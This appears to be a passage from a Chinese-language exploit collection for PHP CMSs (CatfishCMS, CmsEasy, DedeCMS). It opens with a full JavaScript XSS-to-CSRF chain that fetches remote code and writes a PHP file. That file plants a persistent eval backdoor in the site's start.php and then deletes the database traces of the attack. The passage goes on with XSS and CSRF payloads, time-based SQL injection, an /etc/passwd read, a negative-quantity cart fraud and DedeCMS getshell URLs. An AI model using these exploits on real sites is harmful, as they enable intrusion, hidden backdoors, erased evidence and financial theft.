+<span class="token keyword">var</span> articles <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/articles.html'</span><span class="token punctuation">;</span><span class="token comment">//用来获取 verification 绕过检测</span>
+<span class="token keyword">var</span> newpage <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/newpage.html'</span><span class="token punctuation">;</span><span class="token comment">//生成文章地址</span>
+<span class="token keyword">var</span> allpage <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/allpage.html'</span><span class="token punctuation">;</span><span class="token comment">//获取文章链接</span>
+
+<span class="token comment">//需要改的</span>
+<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://0-sec.org'</span><span class="token punctuation">;</span><span class="token comment">//你要日的站的域名</span>
+<span class="token keyword">var</span> directory <span class="token operator">=</span> <span class="token string">'/cms/CatfishCMS-4.6.12/'</span><span class="token punctuation">;</span> <span class="token comment">//日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写)</span>
+<span class="token keyword">var</span> img_trojan_url <span class="token operator">=</span> <span class="token string">'../../../'</span><span class="token operator">+</span><span class="token string">'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg'</span><span class="token punctuation">;</span><span class="token comment">//图片马的地址 修改 + 号后面的即可</span>
+<span class="token keyword">var</span> getshell_code <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt'</span><span class="token punctuation">;</span><span class="token comment">//恶意代码远程包含的地址</span>
+
+<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'&lt;div id="csrf_verification" style="display:none;">&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'&lt;div id="csrf_allpage" style="display:none;">&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>articles<span class="token punctuation">,</span>
+    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
+    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">verification_content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_verification'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>verification_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> verification <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#verification'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用来绕过验证的</span>
+        <span class="token comment">// alert(verification);</span>
+
+        <span class="token comment">//csrf生成文章,引起文件包含漏洞</span>
+        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+            <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>newpage<span class="token punctuation">,</span>
+            <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string-property property">'biaoti'</span><span class="token operator">:</span><span class="token string">'xss_csrf_getshll'</span><span class="token punctuation">,</span>
+                <span class="token string-property property">'template'</span><span class="token operator">:</span>img_trojan_url<span class="token punctuation">,</span>
+                <span class="token string-property property">'verification'</span><span class="token operator">:</span>verification<span class="token punctuation">,</span>
+                <span class="token string-property property">'fabushijian'</span><span class="token operator">:</span><span class="token string">'2017-12-05 11:56:48'</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token comment">//csrf获取shell链接</span>
+                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>allpage<span class="token punctuation">,</span>
+                    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">allpage_content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>allpage_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">var</span> shell_id <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">var</span> shell_url <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage .table-responsive .table-bordered tbody tr td a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token keyword">var</span> shell_content <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">"$myfile = fopen('getshell_code.php', 'w');"</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">'$txt = '</span><span class="token operator">+</span><span class="token string">'file_get_contents("'</span><span class="token operator">+</span>getshell_code<span class="token operator">+</span><span class="token string">'");'</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">'fwrite($myfile, $txt);'</span><span class="token punctuation">;</span>
+                            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>shell_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token comment">//执行shell 生成马子</span>
+                        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+                            <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>shell_url<span class="token punctuation">,</span>
+                            <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
+                            <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'ddd'</span><span class="token operator">:</span>shell_content<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                            <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span><span class="token string">'getshell_code.php'</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span> 
+                                    <span class="token comment">// data: &#123;'zzz':1&#125;</span>
+                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                            <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span><span class="token string">'getshell_code.php'</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span> 
+                                    <span class="token comment">// data: &#123;'zzz':1&#125;</span>
+                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span>   
+                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    <span class="token punctuation">&#125;</span> 
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token punctuation">&#125;</span> 
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>getshell_code.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$start_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'catfish/start.php'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'eval(@$_POST[ddd]);'</span><span class="token punctuation">;</span>
+    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'catfish/start.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$start_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span>zzz<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"application/database.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//分别对应的是 地址，端口号，连接的数据库，编码</span>
+        <span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; port=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostport'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; dbname=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>; charset=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'charset'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
+        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$psw</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">,</span><span class="token variable">$psw</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE from catfish_posts WHERE post_title LIKE '%xss_csrf_getshll%'"</span><span class="token punctuation">;</span>
+        <span class="token variable">$sql_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE from catfish_comments WHERE content LIKE '%xss_csrf_getshll%'"</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getshell_code.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-6-15-前台xss"><a href="#CatfishCMS-4-6-15-前台xss" class="headerlink" title="CatfishCMS 4.6.15 前台xss"></a>CatfishCMS 4.6.15 前台xss</h2><p>相关文件：</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Common.php</p>
+<p>poc：</p>
+<p>注册用户，在提交评论处修改请求体</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">pinglun</span><span class="token punctuation">:</span> <span class="token header-value">&lt;img src=# onerror='alert(1)'></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-6-15-后台文件包含getshell"><a href="#CatfishCMS-4-6-15-后台文件包含getshell" class="headerlink" title="CatfishCMS 4.6.15 后台文件包含getshell"></a>CatfishCMS 4.6.15 后台文件包含getshell</h2><p>相关文件：</p>
+<p>CatfishCMS-4.6.12&#x2F;application&#x2F;admin&#x2F;controller&#x2F;Index.php</p>
+<p>poc：</p>
+<p>上传二次渲染图片马</p>
+<p>上传的触发点</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">CatfishCMS-4.6.12/index.php/admin/Index/newpage.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS后台csrf"><a href="#CatfishCMS后台csrf" class="headerlink" title="CatfishCMS后台csrf"></a>CatfishCMS后台csrf</h2><p>先登录后台</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0-sec.org/index.php/admin/index/modifymanage.html?c=73<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uid<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>73<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>juese<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>verification<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>05f176843c20e12c1364e80b9869ac17<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS后台储存型xss"><a href="#CatfishCMS后台储存型xss" class="headerlink" title="CatfishCMS后台储存型xss"></a>CatfishCMS后台储存型xss</h2><p>网站背景中的管理员可以发布包含存储XSS漏洞的文章 提交标题以抓取数据包 使用burp修改参数 浏览文章可以触发XSS</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">neiron<span class="token operator">=</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="CmsEasy"><a href="#CmsEasy" class="headerlink" title="CmsEasy"></a>CmsEasy</h1><h2 id="CmsEasy-7-3-8-sql注入漏洞"><a href="#CmsEasy-7-3-8-sql注入漏洞" class="headerlink" title="CmsEasy 7.3.8 sql注入漏洞"></a>CmsEasy 7.3.8 sql注入漏洞</h2><p>相关文件：</p>
+<p>lib&#x2F;admin&#x2F;language_admin.php</p>
+<p>poc：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>BENCHMARK<span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CmsEasy-7-3-8-任意文件操作"><a href="#CmsEasy-7-3-8-任意文件操作" class="headerlink" title="CmsEasy 7.3.8 任意文件操作"></a>CmsEasy 7.3.8 任意文件操作</h2><p>观察模板编辑功能，存在对模板的html文件的读取操作，对应到HTTP请求可以明显看到可控参数</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">tplname=/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CmsEasy-7-3-8-本地文件包含漏洞"><a href="#CmsEasy-7-3-8-本地文件包含漏洞" class="headerlink" title="CmsEasy 7.3.8 本地文件包含漏洞"></a>CmsEasy 7.3.8 本地文件包含漏洞</h2><blockquote>
+<p>CmsEasy V7.3.8框架后端的语言编辑功能函数接口对include的文件路径没有做安全性校验，攻击者可以通过该接口包含上传的带有PHP代码内容的任意后缀（合法）文件，导致远程代码执行</p>
+</blockquote>
+<p>相关：</p>
+<p>CmsEasy_7.3.8_UTF-8_20191230&#x2F;lib&#x2F;admin&#x2F;language_admin.php的edit_action函数</p>
+<p>CmsEasy对于任何用户存在文件和图片上传功能，虽然我们不能直接上传php文件（默认禁止），但是可以上传内容为php代码的图片后缀文件，因此可以通过这一处文件包含达到最后高危的命令执行问题</p>
+<hr>
+<h2 id="CmsEasy-7-6-3-2-20200422-逻辑漏洞"><a href="#CmsEasy-7-6-3-2-20200422-逻辑漏洞" class="headerlink" title="CmsEasy 7.6.3.2_20200422 逻辑漏洞"></a>CmsEasy 7.6.3.2_20200422 逻辑漏洞</h2><ul>
+<li>1.登录任意账号</li>
+<li>2.点击任意产品</li>
+<li>3.点开任意一个产品，前提是有余量</li>
+<li>4.输入任意正常数量，burp开启抓包，点击添加到购物车</li>
+<li>5.将抓到的包中的最后一个数字改为负数，然后放包</li>
+</ul>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?case=archive&amp;act=doorders&amp;aid=527&amp;datatype=&amp;thisnum=-100</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.0-sec.org</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost/index.php?case=archive&amp;act=show&amp;aid=527</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=5j671r8cg9kfppbkpl7i0n1te0; loginfalse=0; login_username=admin; login_password=787cc8f99d30dc9cbeeadd77f99efb84; ce_orders_cookie=TL%2BA8RODL9PeNwoN</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>6.此时可以看到购物车中为负数</li>
+<li>7.查看个人中心中的余额，为5600</li>
+<li>8.点击购物车</li>
+<li>9.点击下图内容</li>
+<li>10.填写完成之后，点击在线支付</li>
+<li>11.选择余额支付，点击购买</li>
+<li>12.购买成功</li>
+<li>13.回到个人中心，可以看到余额的变化</li>
+</ul>
+<hr>
+<h1 id="Dedecms"><a href="#Dedecms" class="headerlink" title="Dedecms"></a>Dedecms</h1><h2 id="（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞"><a href="#（CNVD-2018-01221）DedeCMS-V5-7-SP2存在代码执行漏洞" class="headerlink" title="（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞"></a>（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞</h2><blockquote>
+<p>攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
+</blockquote>
+<p>需要登录后台</p>
+<p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞</p>
+<p>通过action&#x3D;upload来获取token</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//0-sec.org/dede/tpl.php?action=upload</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后查看网页源代码，找到token</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//0-sec.org/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="（CVE-2018-9175）Dedecms-V5-7后台的两处getshell"><a href="#（CVE-2018-9175）Dedecms-V5-7后台的两处getshell" class="headerlink" title="（CVE-2018-9175）Dedecms V5.7后台的两处getshell"></a>（CVE-2018-9175）Dedecms V5.7后台的两处getshell</h2><blockquote>
+<p>后台写配置文件过滤不足导致写shell</p>
+</blockquote>
+<p>相关文件：</p>
+<p>&#x2F;dede&#x2F;sys_verifies.php</p>
+<p>&#x2F;dede&#x2F;sys_cache_up.php</p>
+<p>payload：</p>
+<p>将shell写进数据库中</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//0-sec.org/dede/stepselect_main.php?action=addenum_save&amp;ename=123&amp;egroup=;phpinfo();//&amp;islogin=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>因为包含是在同一个文件，所以直接输入</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//0-sec.org/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123&amp;refiles[]=%22;phpinfo();die();//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="（CVE-2019-8362）Dedecms-v5-7-sp2-后台文件上传-getshell"><a href="#（CVE-2019-8362）Dedecms-v5-7-sp2-后台文件上传-getshell" class="headerlink" title="（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell"></a>（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell</h2><blockquote>
+<p>上传zip文件解压缩对于文件名过滤不周，导致getshell</p>
+</blockquote>
+<p>相关：</p>
+<p>&#x2F;dede&#x2F;album_add.php 175行验证后缀</p>
+<p>poc：</p>
+<p>首先构造一个文件名为1.jpg.php的文件，</p>
+<p>将该文件进行压缩，</p>
